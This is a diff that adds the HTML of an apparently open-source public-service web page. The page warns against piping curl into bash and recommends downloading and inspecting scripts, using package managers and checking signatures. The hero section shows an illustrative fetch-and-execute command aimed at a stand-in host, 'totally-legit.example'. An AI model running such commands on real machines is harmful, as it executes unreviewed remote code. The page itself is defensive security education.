@@ -1,0 +1,450 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Just Say No to `curl | bash`</title>
+    <meta
+      name="description"
+      content="A friendly public-service announcement on why piping curl straight into bash is a bad idea — for the people who ask you to do it, and the people who do it."
+    />
+    <meta property="og:title" content="Just Say No to `curl | bash`" />
+    <meta
+      property="og:description"
+      content="You wouldn't run a stranger's script sight-unseen. Don't curl | bash it either."
+    />
+    <meta property="og:type" content="website" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <link
+      rel="icon"
+      href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><circle cx='8' cy='8' r='7' fill='%23d4242c'/><rect x='2.5' y='6.5' width='11' height='3' fill='white' transform='rotate(45 8 8)'/></svg>"
+    />
+  </head>
+  <body>
+    <a class="skip" href="#main">Skip to content</a>
+    <div class="tape" role="presentation"></div>
+
+    <!-- ============================ HERO ============================ -->
+    <header class="hero">
+      <div class="wrap">
+        <div
+          class="seal"
+          role="img"
+          aria-label="No piping the web straight into your shell"
+        >
+          <span class="seal-no">🙅‍♂️</span>
+          <span class="seal-glyph">🌐｜🖥️</span>
+        </div>
+        <h1>Just Say No to<br /><code>curl&nbsp;|&nbsp;bash</code></h1>
+        <p class="subtitle">
+          You wouldn't run a script you've never read, from a server you don't control,
+          that can change its mind every time you ask. So why pipe it straight into your
+          shell?
+        </p>
+
+        <div class="term" style="max-width: 640px; margin: 28px auto">
+          <div class="bar">
+            <i class="r"></i><i class="y"></i><i class="g"></i
+            ><span
+              >~ — this is your shell on
+              <code style="background: none; border: none; color: inherit"
+                >curl | bash</code
+              ></span
+            >
+          </div>
+          <pre><span class="prompt">$</span> <span class="cmd">curl -fsSL https://totally-legit.example/install.sh | bash</span>
+<span class="cmt"># ...and now? Anything. You'll never know what ran.</span>
+<span class="bad">[ now executing 4,000 lines you never saw ]</span>
+<span class="warn">[ nothing was saved. nothing was logged. good luck. ]</span></pre>
+        </div>
+
+        <div class="cta-row">
+          <a class="btn primary" href="#why">Why it's a bad idea</a>
+          <a class="btn" href="#paths">I'm a user / distributor</a>
+          <a class="btn" href="how-it-works.html">How the attack works</a>
+        </div>
+      </div>
+    </header>
+
+    <main id="main">
+      <!-- ============================ INTRO ============================ -->
+      <section class="intro">
+        <div class="wrap">
+          <p class="lead">
+            <code>curl … | bash</code> hands a remote server a blank check to run
+            arbitrary code on your machine —
+            <strong
+              >without ever showing you the code, without keeping a copy, and without any
+              guarantee the next person (or the next request) gets the same thing.</strong
+            >
+          </p>
+          <p>
+            It's not that running install scripts is inherently evil. It's that this
+            <em>particular</em> ritual strips away every safeguard that makes "running
+            code from the internet" merely risky instead of reckless: inspection, a paper
+            trail, reproducibility, and a way to pull the plug when something goes wrong.
+          </p>
+          <div class="callout danger">
+            <strong>The uncomfortable part</strong><br />
+            A server can <em>tell</em> whether you're piping its response into a shell,
+            and serve you something different when you are — even just a small,
+            hard-to-catch percentage of the time.
+            <a href="how-it-works.html">Here's how that works →</a>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================ THREE REASONS ============================ -->
+      <section id="why">
+        <div class="wrap">
+          <h2>Why it's a bad idea</h2>
+          <div class="cards">
+            <article class="card">
+              <div class="icon" aria-hidden="true">🕵️</div>
+              <h3>1. Untraceable &amp; unauditable</h3>
+              <p>
+                The script is executed straight off the wire and then it's gone. No file
+                on disk, nothing in your shell history but
+                <code>curl | bash</code>. After the fact you have
+                <strong>no way to know what actually ran</strong> on your computer — you
+                can't diff it, review it, or even prove what it did.
+              </p>
+            </article>
+            <article class="card">
+              <div class="icon" aria-hidden="true">🎭</div>
+              <h3>2. The server knows you're piping</h3>
+              <p>
+                A web server can detect that its response is being fed directly into a
+                shell (versus saved or viewed) and
+                <strong>serve different content accordingly.</strong> The script you'd see
+                if you opened the URL in a browser need not be the script that runs in
+                your shell.
+                <a href="how-it-works.html">(Yes, really.)</a>
+              </p>
+            </article>
+            <article class="card">
+              <div class="icon" aria-hidden="true">🎲</div>
+              <h3>3. Every request is a fresh roll</h3>
+              <p>
+                Nothing forces a server to send the same bytes twice. A malicious endpoint
+                can install the real software <em>and</em> slip in something extra
+                <strong>just 1% of the time, only when piped to bash</strong> — low enough
+                to dodge reports, invisible to everyone who checked.
+              </p>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================ AUDIENCE PATHS ============================ -->
+      <section id="paths">
+        <div class="wrap">
+          <h2>Pick your lane</h2>
+          <p class="lead">Two kinds of people can stop this. Which one are you?</p>
+          <div class="paths">
+            <div class="path users">
+              <div class="who">// for the person typing it</div>
+              <h3>I run install commands</h3>
+              <p>
+                You've seen a README that says <code>curl … | bash</code> and you're about
+                to paste it. Don't — at least not like that.
+              </p>
+              <h3 style="font-size: 1.05rem">Do this instead:</h3>
+              <ul class="checks">
+                <li>
+                  <strong>Download first, then read, then run.</strong> Split the pipe in
+                  two.
+                </li>
+                <li>
+                  Prefer a <strong>real package manager</strong> when one exists (see
+                  below).
+                </li>
+                <li>
+                  If you must use a script, save it and at least skim it for surprises.
+                </li>
+              </ul>
+              <div class="term">
+                <div class="bar">
+                  <i class="r"></i><i class="y"></i><i class="g"></i
+                  ><span>the two-step</span>
+                  <button
+                    class="copy"
+                    data-copy="curl -fsSL https://example.com/install.sh -o install.sh&#10;less install.sh   # actually read it&#10;sh install.sh"
+                  >
+                    copy
+                  </button>
+                </div>
+                <pre><span class="prompt">$</span> <span class="cmd">curl -fsSL https://example.com/install.sh -o install.sh</span>
+<span class="prompt">$</span> <span class="cmd">less install.sh</span>   <span class="cmt"># actually read it</span>
+<span class="prompt">$</span> <span class="cmd">sh install.sh</span>      <span class="ok"># now you know what ran</span></pre>
+              </div>
+              <p style="font-size: 0.92rem; color: var(--ink-soft)">
+                Saving the file also defeats reasons&nbsp;2 &amp; 3: a server can't tell
+                <code>curl -o</code> from a browser, and you keep evidence of exactly what
+                you received.
+              </p>
+            </div>
+
+            <div class="path distros">
+              <div class="who">// for the person publishing it</div>
+              <h3>I distribute software</h3>
+              <p>
+                Your README says <code>curl … | bash</code> because it's one line and it
+                "just works." It also trains your users to do the most dangerous thing on
+                the internet.
+              </p>
+              <h3 style="font-size: 1.05rem">Do this instead:</h3>
+              <ul class="checks">
+                <li>
+                  <strong>Ship to real package managers</strong> (apt, dnf, Homebrew, npm,
+                  PyPI, cargo…).
+                </li>
+                <li>
+                  Publish <strong>versioned, checksummed, signed</strong> release
+                  artifacts.
+                </li>
+                <li>
+                  If you offer a script, tell people to
+                  <strong>download &amp; inspect it</strong> — and pin it to a tagged,
+                  immutable URL.
+                </li>
+                <li>Document the checksum so a tampered download is obvious.</li>
+              </ul>
+              <div class="callout">
+                <strong>The kindest thing you can do</strong><br />
+                is make the safe path the easy path. Every <code>curl | bash</code> in a
+                README is a habit your users will carry to the next, less trustworthy
+                README.
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================ ALTERNATIVES / REBUTTAL ============================ -->
+      <section id="alternatives">
+        <div class="wrap">
+          <h2>"But package managers run arbitrary code too!"</h2>
+          <p class="lead">
+            True — and it's the most common defense of <code>curl | bash</code>. It's also
+            a false equivalence. "Arbitrary code" isn't one risk level; the
+            <em>distribution channel</em> around the code is what matters.
+          </p>
+          <p>
+            A package registry is a moderated, accountable system: artifacts are uploaded
+            under an identity, pinned to immutable versions, fingerprinted with checksums,
+            often signed, and — crucially —
+            <strong>can be yanked by the registry operator</strong> when they turn out to
+            be malicious. An arbitrary web endpoint is, by design, none of those things.
+            It answers only to whoever owns the domain, and the only way to "take it down"
+            is to convince a hosting provider or law enforcement — which is slow,
+            jurisdiction-dependent, and reactive.
+          </p>
+
+          <table class="cmp">
+            <thead>
+              <tr>
+                <th>Property</th>
+                <th><code>curl | bash</code></th>
+                <th>
+                  Package registry<br /><span style="font-weight: 400; font-size: 0.85em"
+                    >(npm, PyPI, apt, Homebrew…)</span
+                  >
+                </th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>You can read the code before it runs</td>
+                <td class="no">No (by design)</td>
+                <td class="yes">Usually (source / cached artifact)</td>
+              </tr>
+              <tr>
+                <td>The same version is identical for everyone</td>
+                <td class="no">No guarantee</td>
+                <td class="yes">Yes (immutable, pinned versions)</td>
+              </tr>
+              <tr>
+                <td>Integrity check / checksum / signature</td>
+                <td class="no">Rarely</td>
+                <td class="yes">Standard (hashes, lockfiles, signing)</td>
+              </tr>
+              <tr>
+                <td>Audit trail (who published, when)</td>
+                <td class="no">None visible to you</td>
+                <td class="yes">Yes (account + publish history)</td>
+              </tr>
+              <tr>
+                <td>Can be centrally revoked / yanked</td>
+                <td class="no">Only via the host or law enforcement</td>
+                <td class="yes">Yes (registry can pull it)</td>
+              </tr>
+              <tr>
+                <td>Can serve different code per request / per client</td>
+                <td class="no">Yes — trivially</td>
+                <td class="yes">No (cached, mirrored, content-addressed)</td>
+              </tr>
+            </tbody>
+          </table>
+
+          <div class="callout">
+            <strong>Honest footnote</strong><br />
+            Specifics vary by ecosystem — some registries sign by default, some rely on
+            lockfile hashes, some have stronger moderation than others, and none are
+            perfect (typosquatting and account takeovers are real). The point isn't that
+            registries are flawless. It's that they give you
+            <em>handles</em> — inspection, immutability, identity, revocation — that a raw
+            <code>curl | bash</code> endpoint deliberately doesn't. <br /><br />
+            <em
+              >Maintainer's note: claims about per-registry log retention and revocation
+              policies are worth verifying against each registry's current documentation
+              before citing them in a specific argument.</em
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================ FAQ ============================ -->
+      <section id="faq" class="faq">
+        <div class="wrap">
+          <h2>Objections, fielded</h2>
+
+          <details>
+            <summary>
+              "If I don't trust the software, why would I install it at all?"
+            </summary>
+            <p>
+              Trust isn't binary. You can trust a project's intentions and still want
+              defenses against a compromised server, a hijacked domain, a
+              man-in-the-middle, or a malicious mirror. Reading the script and keeping a
+              copy protects you even when the <em>author</em> is perfectly trustworthy but
+              their <em>infrastructure</em> isn't.
+            </p>
+          </details>
+
+          <details>
+            <summary>"It's HTTPS, so it's safe, right?"</summary>
+            <p>
+              HTTPS protects the bytes <em>in transit</em>. It says nothing about whether
+              the server itself is honest, compromised, or serving you a different payload
+              than it served the reviewer down the hall. TLS authenticates the pipe, not
+              the contents.
+            </p>
+          </details>
+
+          <details>
+            <summary>"I read the script in my browser first. Good enough?"</summary>
+            <p>
+              Not quite. The bytes your browser fetched and the bytes your shell executes
+              are two separate requests to a server that's free to answer them differently
+              — including based on whether the second one looks like it's being piped into
+              bash.
+              <a href="how-it-works.html">See how a server can tell →</a> Download the
+              exact file once and run <em>that</em> file.
+            </p>
+          </details>
+
+          <details>
+            <summary>"Splitting it into two commands is just security theater."</summary>
+            <p>
+              It's modest, but it's real. Saving to a file means the server sees an
+              ordinary download it can't distinguish from a browser, you get an artifact
+              you can inspect and re-inspect, and you can compare it to a published
+              checksum. That defeats two of the three problems on this page outright.
+            </p>
+          </details>
+
+          <details>
+            <summary>"Everyone does it. The big projects do it."</summary>
+            <p>
+              They do, and that's exactly why it's worth pushing back — popularity is what
+              normalizes the habit. Plenty of those same projects <em>also</em>
+              ship to real package managers and publish signed releases. Use those.
+            </p>
+          </details>
+        </div>
+      </section>
+
+      <!-- ============================ THE PLEDGE ============================ -->
+      <section class="pledge">
+        <div class="wrap">
+          <h2>Take the D.A.R.E. pledge</h2>
+          <p class="lead" style="color: var(--paper)">
+            <strong>D</strong>on't <strong>A</strong>uto-<strong>R</strong>un
+            <strong>E</strong>choed-from-the-internet scripts.
+          </p>
+          <div class="scroll">
+            <ol>
+              <li>
+                I will <strong>download before I run</strong>, and read what I downloaded.
+              </li>
+              <li>
+                I will reach for a <strong>real package manager</strong> when one exists.
+              </li>
+              <li>
+                If I publish software, I will
+                <strong>stop asking strangers to pipe my server into their shell.</strong>
+              </li>
+              <li>
+                I will remember that
+                <strong>HTTPS protects the pipe, not the payload.</strong>
+              </li>
+              <li>
+                I will be the friend who says, gently,
+                <em>"hey… maybe don't <code>curl | bash</code> that."</em>
+              </li>
+            </ol>
+            <div class="sign">
+              signed, ______________________ &nbsp;&nbsp; date: ____ / ____ / ____
+            </div>
+          </div>
+          <div class="cta-row">
+            <a class="btn primary" href="how-it-works.html">Learn how the attack works</a>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <!-- ============================ FOOTER ============================ -->
+    <footer>
+      <div class="wrap">
+        <div class="cols">
+          <div>
+            <h4>Just Say No</h4>
+            <p style="max-width: 30ch">
+              A public-service announcement for distributors and users alike. Share it,
+              fork it, point your favorite README at it.
+            </p>
+          </div>
+          <div>
+            <h4>On this site</h4>
+            <ul>
+              <li><a href="#why">Why it's a bad idea</a></li>
+              <li><a href="#paths">For users &amp; distributors</a></li>
+              <li><a href="#alternatives">Vs. package managers</a></li>
+              <li><a href="how-it-works.html">How the attack works</a></li>
+            </ul>
+          </div>
+          <div>
+            <h4>Further reading</h4>
+            <ul>
+              <li><a href="how-it-works.html#sources">Sources &amp; citations</a></li>
+              <li>
+                <a href="https://github.com/vergenzt/just-say-no-to-curl-pipe-bash"
+                  >Source on GitHub</a
+                >
+              </li>
+            </ul>
+          </div>
+        </div>
+        <p class="fine">
+          Made with caution and a little bit of humor. No actual shells were harmed. This
+          site is informational; verify ecosystem-specific claims against primary sources
+          before relying on them. &nbsp;MIT-licensed.
+        </p>
+      </div>
+    </footer>
+
+    <script src="assets/js/main.js" defer></script>
+  </body>
+</html>
